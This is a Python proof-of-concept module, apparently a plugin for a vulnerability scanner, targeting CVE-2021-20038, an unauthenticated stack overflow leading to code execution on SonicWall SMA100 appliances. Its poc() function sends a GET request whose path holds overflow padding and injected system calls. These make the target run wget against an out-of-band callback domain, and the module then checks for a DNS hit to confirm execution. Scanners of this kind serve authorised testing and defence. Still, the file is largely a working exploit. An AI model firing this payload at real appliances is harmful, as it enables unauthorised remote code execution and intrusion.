import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''SonicWall SMA100 Stack BoF to Unauthenticated RCE''',
        "description": '''A Stack-based buffer overflow vulnerability in SMA100
Apache httpd server's mod_cgi module environment variables
allows a remote unauthenticated attacker to potentially
execute code as a 'nobody' user in the appliance.
This vulnerability affected SMA 200, 210, 400, 410 and 500v
appliances firmware 10.2.0.8-37sv, 10.2.1.1-19sv,
10.2.1.2-24sv and earlier versions.''',
        "severity": "critical",
        "references": [
            "https://attackerkb.com/topics/QyXRC1wbvC/cve-2021-20038/rapid7-analysis"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-20038",
            "cwe-id": "CWE-787"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "overflow", "rce", "sonicwall"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/{{prefix_addr}}{{system_addr}};{wget,http://%s};{{prefix_addr}}{{system_addr}};{wget,http://%s};?{{repeat("A", 518)}}""" % (oob_domain,oob_domain)
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url